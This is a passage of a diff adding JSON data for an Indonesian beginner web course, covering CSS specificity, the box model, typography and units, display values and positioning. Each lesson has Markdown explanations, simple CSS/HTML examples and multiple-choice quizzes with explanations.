+          {
+            "id": "q-3-1-2",
+            "question": "Perhatikan kode CSS berikut:\np { color: blue; }\n.teks-merah { color: red; }\nJika sebuah paragraf ditulis <p class=\"teks-merah\">Halo</p>, warna teks apakah yang akan tampil di browser?",
+            "options": [
+              "Merah (red)",
+              "Biru (blue)",
+              "Hitam default browser",
+              "Ungu campuran"
+            ],
+            "correctIndex": 0,
+            "explanation": "Class selector (.teks-merah) memiliki bobot spesifisitas (0,0,1,0) yang lebih tinggi dibandingkan tag element selector p (0,0,0,1), sehingga warna merah yang menang."
+          },
+          {
+            "id": "q-3-1-3",
+            "question": "Jika dua aturan CSS memiliki bobot spesifisitas yang sama persis dan menargetkan elemen yang sama, bagaimana browser menentukan aturan mana yang diterapkan?",
+            "options": [
+              "Browser menerapkan aturan yang ditulis paling akhir di dalam file stylesheet (prinsip Cascading).",
+              "Browser memilih aturan yang memiliki jumlah baris paling pendek.",
+              "Browser mencampur kedua nilai properti secara acak.",
+              "Browser mengabaikan kedua aturan dan kembali ke styling bawaan."
+            ],
+            "correctIndex": 0,
+            "explanation": "Prinsip Cascading menetapkan bahwa ketika bobot spesifisitas setara, deklarasi yang didefinisikan paling akhir akan menimpa deklarasi sebelumnya."
+          },
+          {
+            "id": "q-3-1-4",
+            "question": "Mengapa penggunaan deklarasi !important secara berlebihan dianggap sebagai bad practice dalam pengembangan web?",
+            "options": [
+              "Karena merusak alur alami cascading spesifisitas sehingga kode CSS menjadi sangat sulit di-override atau dirawat saat proyek membesar.",
+              "Karena membuat ukuran file CSS membengkak 100 kali lipat.",
+              "Karena deklarasi !important tidak didukung oleh browser Google Chrome.",
+              "Karena browser akan mematikan rendering animasi."
+            ],
+            "correctIndex": 0,
+            "explanation": "!important memaksa override absolut yang menyulitkan developer lain menyesuaikan styling komponen di kemudian hari."
+          }
+        ]
+      },
+      {
+        "id": "lesson-3-2",
+        "stageId": "stage-3",
+        "slug": "css-box-model-margin-border-padding",
+        "title": "CSS Box Model: Margin, Border, Padding & Content",
+        "titleEn": "CSS Box Model: Margin, Border, Padding & Content",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Memahami 4 lapisan Box Model (Content, Padding, Border, Margin) dan pentingnya box-sizing: border-box.",
+        "prerequisites": [
+          "sintaks-css-selektor-dan-spesifisitas"
+        ],
+        "learningObjectives": [
+          "Mengidentifikasi 4 lapisan CSS Box Model dari dalam ke luar: Content, Padding, Border, dan Margin.",
+          "Menghitung total dimensi elemen berdasarkan Box Model standar.",
+          "Menjelaskan fungsi dan keuntungan aturan global box-sizing: border-box.",
+          "Memahami fenomena Margin Collapse pada elemen vertikal."
+        ],
+        "whyMatters": "Box Model adalah fondasi mutlak dari seluruh tata letak (layout) dan jarak spasial pada halaman web.",
+        "careerContext": "Setiap CSS reset modern selalu menetapkan `box-sizing: border-box` sebagai aturan paling pertama pada proyek.",
+        "commonMistakes": [
+          "Mengira penambahan padding tidak akan memperbesar ukuran fisik kotak elemen jika menggunakan `box-sizing: content-box` bawaan lama.",
+          "Bingung saat dua margin vertikal bertumpuk dan nilainya tidak bertambah (Margin Collapse)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Box Model",
+            "definition": "Model kotak persegi empat yang membungkus setiap elemen HTML di halaman web."
+          },
+          {
+            "term": "Content",
+            "definition": "Area inti tempat teks, gambar, atau elemen anak berada."
+          },
+          {
+            "term": "Padding",
+            "definition": "Ruang transparan di dalam elemen antara konten dan garis batas (border)."
+          },
+          {
+            "term": "Border",
+            "definition": "Garis tepi pembatas yang membungkus padding dan konten."
+          },
+          {
+            "term": "Margin",
+            "definition": "Ruang jarak luar yang memisahkan elemen tersebut dari elemen tetangga di sekitarnya."
+          },
+          {
+            "term": "box-sizing: border-box",
+            "definition": "Aturan perhitungan di mana nilai width dan height sudah mencakup padding dan border."
+          }
+        ],
+        "contentMd": "# CSS Box Model: Margin, Border, Padding & Content\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari fondasi tata letak web: **CSS Box Model**. Di mata browser, setiap elemen HTML—mulai dari paragraf kecil hingga kartu produk—adalah sebuah kotak persegi yang tersusun dari 4 lapisan konsentris.\n\n## Mengapa Konsep Ini Penting?\nBanyak pemula kebingungan mengapa sebuah tombol berukuran lebar `100px` tiba-tiba meluap (*overflow*) menjadi `140px` setelah diberi padding. Memahami Box Model dan properti `box-sizing` adalah kunci menciptakan layout yang presisi dan stabil.\n\n## 4 Lapisan CSS Box Model (Dari Dalam ke Luar)\n\n```text\n+---------------------------------------------------+\n| MARGIN (Jarak Luar Antar Elemen)                 |\n|   +---------------------------------------------+ |\n|   | BORDER (Garis Tepi Pembatas)                | |\n|   |   +---------------------------------------+ | |\n|   |   | PADDING (Ruang Dalam Kotak)           | | |\n|   |   |   +---------------------------------+ | | |\n|   |   |   | CONTENT (Teks / Gambar / Anak) | | | |\n|   |   |   +---------------------------------+ | | |\n|   |   +---------------------------------------+ | |\n|   +---------------------------------------------+ |\n+---------------------------------------------------+\n```\n\n1. **Content (Konten)**: Area tempat teks, icon, atau gambar berada. Ukurannya diatur oleh `width` dan `height`.\n2. **Padding (Ruang Dalam)**: Jarak bantalan antara konten dengan garis border. Memiliki warna latar belakang yang sama dengan elemen.\n3. **Border (Garis Tepi)**: Garis batas fisik yang membungkus padding dan konten (bisa solid, dashed, atau transparan).\n4. **Margin (Jarak Luar)**: Ruang kosong di luar border yang mendorong elemen tetangga agar tidak menempel rapat.\n\n## Revolusi: `box-sizing: border-box`\n\n### Masalah pada Default Lama (`content-box`):\nJika Anda menyetel:\n```css\n.kotak {\n  width: 200px;\n  padding: 20px;\n  border: 5px solid black;\n}\n```\nTotal lebar fisik elemen di layar adalah:  \n`200px (width) + 40px (padding kiri-kanan) + 10px (border kiri-kanan) = 250px!`  \nKotak membengkak lebih besar dari nilai `width` yang Anda tentukan.\n\n### Solusi Modern: `border-box`\nDengan menambahkan `box-sizing: border-box`, nilai `width: 200px` terkunci secara mutlak. Penambahan padding `20px` akan menyusutkan area konten ke dalam tanpa memperbesar ukuran total kotak (`200px tetap 200px`).\n\n```css\n/* Aturan Reset Standar Wajib di Seluruh Proyek Modern */\n*, *::before, *::after {\n  box-sizing: border-box;\n}\n```\n\n## Fenomena Margin Collapse\nKetika dua elemen blok (misalnya dua buah paragraf `<p>`) diletakkan bertumpuk vertikal:\n- Paragraf 1 memiliki `margin-bottom: 30px`.\n- Paragraf 2 memiliki `margin-top: 20px`.\n- Jarak aktual di antara keduanya **BUKAN** 50px, melainkan **30px** (hanya mengambil nilai margin terbesar). Fenomena ini disebut **Margin Collapse**.\n\n## Kesalahan Umum Pemula\n- **Memberi nilai margin negatif tanpa tujuan jelas**: Dapat menyebabkan elemen saling menimpa secara tidak terkendali.\n- **Menggunakan margin untuk memberi jarak teks ke tepi kartu**: Selalu gunakan `padding` untuk ruang di dalam kartu, dan gunakan `margin` untuk jarak antar kartu.\n\n## Praktik Mandiri\n1. Buat sebuah `<div class=\"kartu\">` dengan teks pendek di dalamnya.\n2. Berikan CSS `width: 300px; padding: 24px; border: 2px solid #2563eb; margin: 40px;`.\n3. Buka browser DevTools, klik tab **Computed**, dan arahkan kursor ke diagram Box Model untuk melihat visualisasi keempat lapisannya.\n\n## Ringkasan\n- Box Model terdiri dari 4 lapisan: **Content $\\rightarrow$ Padding $\\rightarrow$ Border $\\rightarrow$ Margin**.\n- **Padding** memberi jarak di DALAM kotak, sedangkan **Margin** memberi jarak di LUAR kotak.\n- Selalu gunakan **`box-sizing: border-box`** agar ukuran lebar elemen tidak membengkak saat diberi padding dan border.\n- Margin vertikal yang bersebelahan akan mengalami **Margin Collapse** (mengambil nilai terbesar).",
+        "quizzes": [
+          {
+            "id": "q-3-2-1",
+            "question": "Secara berurutan dari lapisan paling dalam ke lapisan paling luar, manakah struktur CSS Box Model yang benar?",
+            "options": [
+              "Content -> Padding -> Border -> Margin",
+              "Content -> Margin -> Border -> Padding",
+              "Margin -> Border -> Padding -> Content",
+              "Border -> Content -> Padding -> Margin"
+            ],
+            "correctIndex": 0,
+            "explanation": "Struktur lapisan Box Model dimulai dari Content (inti), dibungkus oleh Padding (ruang dalam), Border (garis tepi), dan Margin (jarak luar)."
+          },
+          {
+            "id": "q-3-2-2",
+            "question": "Apa fungsi utama dari aturan CSS global box-sizing: border-box?",
+            "options": [
+              "Membuat nilai width dan height sudah mencakup padding dan border di dalamnya, sehingga ukuran total elemen tidak membengkak saat diberi padding.",
+              "Menghilangkan seluruh garis border dari halaman web secara otomatis.",
+              "Mengubah bentuk sudut elemen menjadi lingkaran bulat.",
+              "Menghapus margin bawaan browser secara otomatis."
+            ],
+            "correctIndex": 0,
+            "explanation": "Dengan border-box, jika lebar disetel 200px, penambahan padding dan border akan diserap ke dalam tanpa memperbesar total dimensi elemen."
+          },
+          {
+            "id": "q-3-2-3",
+            "question": "Apa yang dimaksud dengan fenomena 'Margin Collapse' dalam CSS Box Model?",
+            "options": [
+              "Ketika margin vertikal (atas dan bawah) dari dua elemen blok yang bertetangga saling bertumpuk dan hanya mengambil nilai terbesar, bukan dijumlahkan.",
+              "Ketika padding elemen bocor keluar dari garis border.",
+              "Ketika lebar konten melebihi lebar layar smartphone.",
+              "Ketika margin kiri dan kanan saling menolak."
+            ],
+            "correctIndex": 0,
+            "explanation": "Margin collapse adalah perilaku bawaan CSS di mana margin vertikal antara elemen blok saling bergabung menjadi satu nilai terbesar."
+          }
+        ]
+      },
+      {
+        "id": "lesson-3-3",
+        "stageId": "stage-3",
+        "slug": "tipografi-warna-dan-satuan-ukuran",
+        "title": "Tipografi, Warna & Satuan Ukuran (px, rem, em, %)",
+        "titleEn": "Typography, Colors & CSS Units",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Mengatur font, hirarki tipografi, format warna modern (HEX, RGB, HSL), dan satuan ukuran relatif (rem vs em vs px).",
+        "prerequisites": [
+          "css-box-model-margin-border-padding"
+        ],
+        "learningObjectives": [
+          "Membedakan satuan ukuran absolut (px) dan relatif (rem, em, %, vw, vh).",
+          "Menjelaskan mengapa rem adalah standar terbaik untuk tipografi yang aksesibel dan scalable.",
+          "Menerapkan format warna modern (HEX, RGBA, HSL) dengan saluran transparansi (alpha channel).",
+          "Mengatur properti tipografi (font-family, font-weight, line-height, letter-spacing)."
+        ],
+        "whyMatters": "Menggunakan satuan `rem` menghormati preferensi ukuran font pengguna di pengaturan browser (aksesibilitas pengguna lansia/low-vision).",
+        "careerContext": "Design system modern di Tailwind CSS dan Figma tokens selalu berbasis kelipatan skala `rem`.",
+        "commonMistakes": [
+          "Mengunci semua ukuran font dengan `px` mati, sehingga teks tidak membesar saat pengguna mengubah pengaturan zoom browser.",
+          "Mengabaikan `line-height` (jarak antar baris) yang membuat teks panjang sulit dibaca."
+        ],
+        "keyTerms": [
+          {
+            "term": "px (Pixel)",
+            "definition": "Satuan ukuran absolut berbasis titik layar fisik."
+          },
+          {
+            "term": "rem (Root EM)",
+            "definition": "Satuan ukuran relatif yang mengacu pada font-size elemen root <html> (default: 16px = 1rem)."
+          },
+          {
+            "term": "em",
+            "definition": "Satuan ukuran relatif yang mengacu pada font-size elemen parent langsungnya."
+          },
+          {
+            "term": "HSL",
+            "definition": "Hue, Saturation, Lightness: format warna intuitif berbasis sudut lingkaran warna dan persentase."
+          }
+        ],
+        "contentMd": "# Tipografi, Warna & Satuan Ukuran (px, rem, em, %)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara mengatur tipografi profesional, format penulisan warna modern (**HEX, RGB, HSL**), serta memilih satuan ukuran yang tepat (**`px` vs `rem` vs `em` vs `%`**).\n\n## Mengapa Konsep Ini Penting?\nDesain web yang baik bertumpu pada keterbacaan (*readability*). Menggunakan satuan ukuran yang salah dapat merusak aksesibilitas bagi pengguna yang memperbesar ukuran font bawaan browser mereka.\n\n## 1. Satuan Ukuran CSS: Absolut vs Relatif\n\n### A. Satuan Absolut (`px`)\n- **`px` (Pixel)**: Satuan statis tetap. `16px` akan selalu berukuran 16 pixel di layar apapun.\n- **Kelemahan**: Mengunci `font-size` dengan `px` mengabaikan setelan aksesibilitas pengguna di browser.\n\n### B. Satuan Relatif (`rem` dan `em`)\n- **`rem` (Root EM)**: Relatif terhadap ukuran font elemen **root (`<html>`)**.\n  - Default browser: `1rem = 16px`.\n  - `0.875rem = 14px` (Teks kecil).\n  - `1.5rem = 24px` (Sub-judul).\n  - `2rem = 32px` (Judul besar).\n  - **Best Practice**: Gunakan `rem` untuk seluruh `font-size`, `padding`, dan `margin` agar skala antarmuka membesar/mengecil secara harmonis.\n- **`em`**: Relatif terhadap ukuran font **elemen induk langsungnya (*parent*)**.\n  - Cocok untuk ikon atau padding tombol yang ukurannya ingin otomatis proporsional mengikuti ukuran font tombol tersebut.\n\n## 2. Format Warna CSS Modern\nCSS mendukung beberapa model representasi warna:\n\n```css\n/* 1. Hexadecimal (HEX) */\ncolor: #2563eb;        /* 6 digit */\ncolor: #2563eb80;      /* 8 digit (dengan alpha transparansi) */\n\n/* 2. RGB & RGBA (Red, Green, Blue, Alpha) */\ncolor: rgb(37, 99, 235);\ncolor: rgba(37, 99, 235, 0.5); /* 50% transparan */\n\n/* 3. HSL (Hue 0-360, Saturation %, Lightness %) -> Paling Intuitif! */\ncolor: hsl(220, 85%, 55%);\ncolor: hsl(220 85% 55% / 0.8);  /* Sintaks modern dengan alpha */\n```\n\n## 3. Pengaturan Tipografi Profesional\n```css\nbody {\n  /* Font Family dengan Fallback Aman */\n  font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;\n  \n  /* Ukuran & Kerapatan */\n  font-size: 1rem;         /* 16px */\n  font-weight: 400;        /* Regular */\n  line-height: 1.6;        /* Jarak antar baris nyaman (160%) */\n  letter-spacing: -0.01em; /* Kerapatan huruf modern */\n  color: #1e293b;          /* Teks gelap nyaman (bukan hitam pekat #000) */\n}\n```\n\n## Kesalahan Umum Pemula\n- **Memakai hitam pekat (#000000) pada latar putih (#ffffff)**: Kontras yang terlalu tajam melelahkan mata pembaca. Gunakan warna abu-abu gelap seperti `#0f172a` atau `#1e293b`.\n- **Lupa menyertakan font fallback**: Jika font Google gagal dimuat, browser membutuhkan cadangan seperti `sans-serif`.\n\n## Praktik Mandiri\n1. Buat elemen kartu dengan `font-size: 1.125rem` dan `line-height: 1.6`.\n2. Ubah warna background-nya menggunakan format HSL dengan alpha channel transparansi 0.9.\n\n## Ringkasan\n- Gunakan **`rem`** sebagai standar utama ukuran font dan spacing layout.\n- **`rem`** relatif terhadap root `<html>`, sedangkan **`em`** relatif terhadap parent-nya.\n- Format **HSL** adalah format warna paling intuitif untuk memanipulasi kecerahan dan transparansi.\n- Selalu atur **`line-height: 1.5 - 1.6`** pada teks paragraf untuk kenyamanan membaca.",
+        "quizzes": [
+          {
+            "id": "q-3-3-1",
+            "question": "Apa perbedaan paling mendasar antara satuan ukuran rem dan em dalam tipografi CSS?",
+            "options": [
+              "rem relatif terhadap ukuran font elemen root (<html>), sedangkan em relatif terhadap ukuran font elemen induk langsungnya (parent).",
+              "rem hanya untuk margin sedangkan em hanya untuk padding.",
+              "rem bernilai tetap dalam milimeter sedangkan em dalam pixel.",
+              "rem tidak mendukung desain responsif."
+            ],
+            "correctIndex": 0,
+            "explanation": "rem (Root EM) selalu konsisten mengacu pada font-size elemen root <html> (default 16px = 1rem), menjadikannya standar ideal untuk tipografi scalable."
+          },
+          {
+            "id": "q-3-3-2",
+            "question": "Jika ukuran font dasar pada elemen <html> adalah 16px, berapa nilai piksel yang setara dengan 1.5rem?",
+            "options": [
+              "24px",
+              "20px",
+              "16.5px",
+              "32px"
+            ],
+            "correctIndex": 0,
+            "explanation": "Perhitungan matematis: 1.5 * 16px = 24px."
+          },
+          {
+            "id": "q-3-3-3",
+            "question": "Mengapa menggunakan satuan relatif rem lebih direkomendasikan daripada satuan statis px untuk teks artikel?",
+            "options": [
+              "Karena rem otomatis menyesuaikan dengan preferensi ukuran font yang disetel pengguna di pengaturan aksesibilitas browser.",
+              "Karena rem membuat ukuran file website menjadi 0 KB.",
+              "Karena satuan px dilarang oleh standar W3C.",
+              "Karena rem mengubah teks menjadi huruf kapital secara otomatis."
+            ],
+            "correctIndex": 0,
+            "explanation": "Satuan rem menghormati preferensi zoom dan font accessibility pengguna browser, mencegah teks terkunci kaku."
+          }
+        ]
+      },
+      {
+        "id": "lesson-3-4",
+        "stageId": "stage-3",
+        "slug": "css-display-block-inline-none",
+        "title": "CSS Display: Block, Inline, Inline-Block & None",
+        "titleEn": "CSS Display Properties",
+        "level": "BEGINNER",
+        "estimatedMinutes": 12,
+        "description": "Memahami perilaku aliran layout elemen: block (lebar penuh), inline (mengalir di baris), inline-block, dan perbedaan display: none vs visibility: hidden.",
+        "prerequisites": [
+          "tipografi-warna-dan-satuan-ukuran"
+        ],
+        "learningObjectives": [
+          "Membedakan karakteristik perilaku visual antara display block, inline, dan inline-block.",
+          "Menjelaskan batasan dimensi width/height dan margin/padding pada elemen inline.",
+          "Membedakan dampak display: none (menghapus ruang fisik) dan visibility: hidden (menyembunyikan visual namun ruang tetap ada)."
+        ],
+        "whyMatters": "Memahami display property mencegah bug layout klasik di mana `width` atau `margin-top` tidak bereaksi pada tag `<span>` atau `<a>`.",
+        "careerContext": "Memahami aliran render normal (Normal Flow) adalah prasyarat wajib sebelum mempelajari Flexbox dan CSS Grid.",
+        "commonMistakes": [
+          "Mencoba memberi `width` atau `height` pada elemen inline murni (seperti `<span>`) yang tidak akan direspon browser.",
+          "Mengira `visibility: hidden` menghapus elemen dari alur layout halaman."
+        ],
+        "keyTerms": [
+          {
+            "term": "display",
+            "definition": "Properti CSS penentu bagaimana kotak elemen dirender di dalam alur dokumen."
+          },
+          {
+            "term": "block",
+            "definition": "Elemen yang selalu memulai baris baru dan mengambil lebar 100% dari kontainernya (contoh: <div>, <p>)."
+          },
+          {
+            "term": "inline",
+            "definition": "Elemen yang mengalir berdampingan di samping teks dan tidak dapat diatur nilai width/height-nya (contoh: <span>, <a>)."
+          },
+          {
+            "term": "inline-block",
+            "definition": "Elemen yang mengalir berdampingan dalam satu baris namun tetap menerima pengaturan width, height, dan padding."
+          }
+        ],
+        "contentMd": "# CSS Display: Block, Inline, Inline-Block & None\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari properti **`display`**: mekanisme dasar browser dalam mengatur apakah sebuah elemen menempati satu baris penuh (**`block`**), mengalir di samping teks (**`inline`**), menggabungkan keduanya (**`inline-block`**), atau disembunyikan sepenuhnya (**`none`**).\n\n## Mengapa Konsep Ini Penting?\nPernahkah Anda mencoba memberikan `width: 200px` pada tag `<span>` atau `<a>`, tetapi ukurannya sama sekali tidak berubah? Hal ini terjadi karena elemen inline secara alami menolak pengaturan dimensi lebar dan tinggi.\n\n## 1. Perbandingan Karakteristik Nilai Display\n\n| Nilai Display | Mulai Baris Baru? | Menerima Width & Height? | Menerima Margin & Padding? | Contoh Elemen Default |\n| :--- | :---: | :---: | :---: | :--- |\n| **`block`** | **YA** (Lebar 100%) | **YA** | **YA** (Penuh atas/bawah/kiri/kanan) | `<div>`, `<p>`, `<h1>`, `<section>` |\n| **`inline`** | **TIDAK** (Mengalir ke samping) | **TIDAK** | Hanya horizontal (kiri/kanan) | `<span>`, `<a>`, `<strong>`, `<em>` |\n| **`inline-block`** | **TIDAK** (Mengalir ke samping) | **YA** | **YA** (Penuh di semua sisi) | `<button>`, `<input>`, `<img>` |\n| **`none`** | - | - | - | Elemen dihilangkan dari alur layout |\n\n## 2. Contoh Penggunaan `inline-block` pada Tombol\nSecara default, tag link `<a>` adalah elemen `inline`. Untuk membuatnya menjadi tombol yang menarik dengan padding atas-bawah dan dimensi yang stabil, kita mengubah display-nya menjadi `inline-block`:\n\n```css\n/* Mengubah tag <a> inline menjadi tombol dengan dimensi */\n.tombol-tautan {\n  display: inline-block;\n  width: 160px;\n  text-align: center;\n  padding: 10px 16px;\n  background-color: #2563eb;\n  color: white;\n  text-decoration: none;\n  border-radius: 6px;\n}\n```\n\n## 3. Perbedaan Kritis: `display: none` vs `visibility: hidden`\n- **`display: none;`**: Elemen **dihapus sepenuhnya dari alur tata letak**. Ruang fisik kotak runtuh seolah elemen tersebut tidak pernah ada di halaman.\n- **`visibility: hidden;`**: Elemen disembunyikan secara visual (tidak terlihat), namun **ruang fisiknya tetap dipertahankan** sebagai kotak kosong transparan.\n\n```css\n/* Kotak lenyap dan tidak memakan ruang sama sekali */\n.sembunyi-total {\n  display: none;\n}\n\n/* Kotak tak terlihat tapi ruang kosong tetap ada */\n.transparan-kosong {\n  visibility: hidden;\n}\n```\n\n## Kesalahan Umum Pemula\n- **Menaruh elemen block di dalam elemen inline**: Memasukkan tag `<div>` atau `<p>` ke dalam tag `<span>` yang melanggar spesifikasi HTML dan merusak tata letak.\n- **Menggunakan visibility: hidden saat ingin menutup modal dialog**: Akan menyisakan ruang kosong besar yang memicu scrollbar yang tidak diinginkan.\n\n## Praktik Mandiri\n1. Buat 3 buah tag `<a>` berturut-turut.\n2. Berikan class dengan `display: inline-block; width: 120px; padding: 12px; margin-right: 8px;`.\n3. Amati bagaimana ketiga link tersebut dapat berjajar ke samping dengan lebar yang sama persis.\n\n## Ringkasan\n- Elemen **`block`** selalu mengambil satu baris penuh dan menerima width/height.\n- Elemen **`inline`** mengalir di samping teks dan menolak width/height.\n- Elemen **`inline-block`** dapat berjajar ke samping dalam satu baris namun tetap dapat diatur dimensinya.\n- **`display: none`** menghapus elemen beserta ruang fisiknya, sedangkan **`visibility: hidden`** mempertahankan ruang kosongnya.",
+        "quizzes": [
+          {
+            "id": "q-3-4-1",
+            "question": "Bagaimana perilaku default dari elemen dengan properti display: block (seperti <div> atau <p>)?",
+            "options": [
+              "Selalu memulai baris baru dan mengambil lebar penuh (100%) dari kontainer induknya.",
+              "Mengalir berdampingan di samping teks dan tidak dapat diatur nilai width-nya.",
+              "Menghilang dari layar dan tidak memakan ruang layout.",
+              "Otomatis berubah menjadi tabel data."
+            ],
+            "correctIndex": 0,
+            "explanation": "Elemen blok selalu menempati satu baris penuh secara vertikal dan memungkinkan pengaturan width, height, margin, dan padding secara bebas."
+          },
+          {
+            "id": "q-3-4-2",
+            "question": "Apa keunggulan dari display: inline-block dibandingkan display: inline biasa?",
+            "options": [
+              "inline-block tetap mengalir berdampingan dalam satu baris, namun dapat diatur nilai width, height, dan padding vertikalnya secara presisi.",
+              "inline-block memaksa elemen pindah ke baris baru.",
+              "inline-block secara otomatis mengaktifkan fitur CSS Grid.",
+              "inline-block menghapus seluruh gaya styling."
+            ],
+            "correctIndex": 0,
+            "explanation": "Elemen inline murni tidak dapat menerima properti width/height, sedangkan inline-block menggabungkan sifat mengalir inline dengan kemampuan dimensi block."
+          },
+          {
+            "id": "q-3-4-3",
+            "question": "Apa perbedaan efek antara display: none; dan visibility: hidden; pada halaman web?",
+            "options": [
+              "display: none menghapus elemen dari alur layout (tidak memakan ruang), sedangkan visibility: hidden menyembunyikan visual namun ruang fisiknya tetap ada.",
+              "Keduanya memiliki efek visual dan fisik yang persis sama tanpa perbedaan.",
+              "visibility: hidden menghapus elemen dari DOM secara permanen.",
+              "display: none hanya berlaku pada perangkat desktop."
+            ],
+            "correctIndex": 0,
+            "explanation": "display: none meruntuhkan ruang yang ditempati elemen seolah tidak ada, sedangkan visibility: hidden membuat elemen tak terlihat seperti kotak kosong transparan."
+          }
+        ]
+      },
+      {
+        "id": "lesson-3-5",
+        "stageId": "stage-3",
+        "slug": "css-positioning-relative-absolute-fixed-sticky",
+        "title": "CSS Positioning: Relative, Absolute, Fixed & Sticky",
+        "titleEn": "CSS Positioning Systems",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Mengontrol posisi elemen dengan static, relative, absolute (terhadap parent non-static), fixed (viewport), sticky, dan stacking context dengan z-index.",
+        "prerequisites": [
+          "css-display-block-inline-none"
+        ],
+        "learningObjectives": [
+          "Membedakan perilaku 5 sistem posisi CSS: static, relative, absolute, fixed, dan sticky.",
+          "Menerapkan pola pasangan relative (parent) dan absolute (child) untuk penempatan presisi.",
+          "Membuat navbar mengambang dengan position: fixed atau position: sticky.",
+          "Mengontrol urutan tumpukan visual sumbu 3D menggunakan z-index."
+        ],
+        "whyMatters": "Positioning adalah teknik yang digunakan untuk membuat badge notifikasi di pojok avatar, modal popup, tooltip melayang, dan navbar yang menempel di atas layar saat scroll.",
+        "careerContext": "Menguasai koordinat spasial CSS adalah kemampuan esensial dalam membangun UI interaktif yang kompleks.",
+        "commonMistakes": [
+          "Memberikan `position: absolute` tanpa memberi `position: relative` pada parent-nya, sehingga elemen melompat bersandar ke pojok layar browser (body).",
+          "Memberikan nilai `z-index: 999999` sembarangan tanpa memahami Stacking Context."
+        ],
+        "keyTerms": [
+          {
+            "term": "position: static",
+            "definition": "Posisi default browser yang mengikuti alur dokumen normal."
+          },
+          {
+            "term": "position: relative",
+            "definition": "Posisi yang bergeser relatif dari posisi aslinya tanpa mengganggu posisi elemen sekitar."
+          },
+          {
+            "term": "position: absolute",
+            "definition": "Posisi yang dicabut dari alur normal dan diletakkan relatif terhadap ancestor non-static terdekat."
+          },
+          {
+            "term": "position: fixed",
+            "definition": "Posisi yang menempel permanen relatif terhadap jendela layar viewport browser."
+          },
+          {
+            "term": "position: sticky",
+            "definition": "Posisi yang berperilaku relatif hingga batas gulir tertentu, lalu menempel seperti fixed."
+          },
+          {
+            "term": "z-index",
+            "definition": "Properti penentu urutan tumpukan kedalaman lapisan pada sumbu Z (depth)."
+          }
+        ],
+        "contentMd": "# CSS Positioning: Relative, Absolute, Fixed & Sticky\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara memindahkan elemen keluar dari alur normal menggunakan properti **`position`** (**`static`**, **`relative`**, **`absolute`**, **`fixed`**, **`sticky`**) serta mengelola lapisan tumpukan dengan **`z-index`**.\n\n## Mengapa Konsep Ini Penting?\nBagaimana cara membuat badge angka notifikasi merah tepat di sudut kanan atas foto profil? Atau membuat tombol \"Kembali ke Atas\" yang melayang di pojok kanan bawah layar? Semua interaksi ini menggunakan sistem **CSS Positioning**.\n\n## 1. Lima Jenis Nilai `position`\n\n### A. `position: static` (Default)\n- Perilaku bawaan browser: elemen mengalir normal dari atas ke bawah.\n- Mengabaikan properti koordinat `top`, `right`, `bottom`, `left`, dan `z-index`.\n\n### B. `position: relative`\n- Elemen tetap menempati ruang aslinya di alur dokumen.\n- Dapat digeser menggunakan `top`, `left`, dll. relatif dari posisi aslinya tanpa mengganggu elemen tetangga.\n- **Fungsi Terpenting**: Menjadi **titik acuan koordinat (anchor parent)** bagi elemen anak yang memiliki `position: absolute`.\n\n### C. `position: absolute`\n- Elemen **dicabut dari alur normal** (tidak memakan ruang fisik bagi elemen lain).\n- Koordinat `top/right/bottom/left` dihitung bersandar pada **ancestor/parent terdekat yang memiliki posisi selain static** (biasanya parent dengan `position: relative`).\n- Jika tidak ada parent yang berposisi, ia akan bersandar pada dokumen viewport (`<body>`).\n\n### D. `position: fixed`\n- Elemen dicabut dari alur dokumen dan **menempel permanen relatif terhadap jendela layar (viewport)**.\n- Tidak ikut bergeser saat halaman digulir ke bawah (cocok untuk Navbar melayang atau Tombol Chat WhatsApp).\n\n### E. `position: sticky`\n- Gabungan cerdas antara `relative` dan `fixed`.\n- Mengalir normal saat di-scroll, namun begitu mencapai koordinat tertentu (misal `top: 0`), ia akan **mengunci menempel** di layar sampai batas kontainer induknya habis.\n\n## 2. Pola Emas: Parent Relative & Child Absolute (Badge Notifikasi)\n\n```html\n<div class=\"avatar-container\">\n  <img src=\"/avatar.jpg\" alt=\"Foto Profil\" class=\"avatar-img\" />\n  <span class=\"badge-notifikasi\">3</span>\n</div>\n\n<style>\n  /* 1. Parent sebagai titik acuan koordinat */\n  .avatar-container {\n    position: relative;\n    width: 60px;\n    height: 60px;\n    display: inline-block;\n  }\n\n  /* 2. Child diletakkan presisi di pojok kanan atas */\n  .badge-notifikasi {\n    position: absolute;\n    top: -5px;\n    right: -5px;\n    background-color: #ef4444; /* Merah */\n    color: white;\n    font-size: 0.75rem;\n    padding: 2px 6px;\n    border-radius: 9999px;\n  }\n</style>\n```\n\n## 3. Mengatur Tumpukan Lapisan dengan `z-index`\nProperti `z-index` mengatur urutan tumpukan pada sumbu kedalaman 3D (Z-axis). Elemen dengan nilai `z-index` lebih tinggi akan tampil di depan elemen dengan nilai lebih rendah.\n> **Syarat Wajib**: `z-index` hanya berfungsi pada elemen yang memiliki `position` selain `static` (misal: relative, absolute, fixed).\n\n## Kesalahan Umum Pemula\n- **Lupa menyetel `position: relative` pada parent**: Menyebabkan elemen absolute melompat ke sudut terjauh browser karena tidak menemukan kontainer jangkar.\n- **Lupa menyertakan koordinat pada sticky**: Menulis `position: sticky` tanpa menyertakan `top: 0` tidak akan memicu efek penempelan saat scroll.\n\n## Praktik Mandiri\n1. Buat kontainer kartu produk dengan `position: relative`.\n2. Tambahkan pita label diskon \"SALE 50%\" di pojok kiri atas kartu menggunakan `position: absolute; top: 10px; left: 10px;`.\n\n## Ringkasan\n- **`relative`** menggeser elemen dari posisi aslinya dan menjadi jangkar bagi anak absolute.\n- **`absolute`** menempatkan elemen presisi relatif terhadap parent non-static terdekat.\n- **`fixed`** menempel permanen relatif terhadap jendela layar (*viewport*).\n- **`sticky`** menempel saat batas scroll tertentu tercapai.\n- **`z-index`** mengatur urutan lapisan visual elemen yang memiliki posisi.",
+        "quizzes": [
+          {
+            "id": "q-3-5-1",
